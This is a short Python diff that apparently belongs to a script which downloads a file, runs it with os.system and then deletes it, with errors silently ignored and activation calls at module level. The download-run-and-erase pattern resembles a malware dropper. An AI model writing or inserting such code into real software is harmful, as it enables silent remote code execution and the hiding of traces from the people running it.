@@ -116,18 +116,15 @@ def DownloadFile(url):
         None
     return None
 
-def RemoveFile(local_filename):
-    try:
-        os.remove(local_filename)
-    except:
-        None
 
 def RunExeFile(file):
-    if (file is not None):
+    if os.path.isfile(file):
         try:
             os.system(file)
+            os.remove(file)
         except:
             None
+    return
 
 conf()
 Activate()
